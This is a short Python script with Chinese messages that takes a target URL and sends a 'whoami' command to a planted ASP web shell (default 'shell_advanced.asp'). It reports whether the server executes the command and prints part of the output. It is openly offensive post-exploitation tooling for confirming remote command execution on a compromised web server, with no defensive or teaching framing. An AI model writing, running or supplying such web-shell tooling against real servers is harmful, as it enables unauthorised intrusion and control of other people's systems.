#!/usr/bin/env python3
import requests
import sys

def test_asp_webshell(url, filename="shell_advanced.asp"):
    """测试ASP WebShell是否可执行"""
    print(f"[*] 测试ASP WebShell: {filename}")

    test_url = f"{url}/{filename}"
    data = {"cmd": "whoami"}

    try:
        response = requests.post(test_url, data=data, timeout=10)
        if response.status_code == 200:
            print(f"[+] ASP WebShell执行成功! URL: {test_url}")
            print(f"[+] 响应内容: {response.text[:200]}")
            return True
        else:
            print(f"[-] ASP WebShell执行失败，状态码: {response.status_code}")
            return False
    except Exception as e:
        print(f"[-] 连接失败: {e}")
        return False

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("用法: python verify_asp.py <目标URL>")
        sys.exit(1)

    target_url = sys.argv[1]
    test_asp_webshell(target_url)
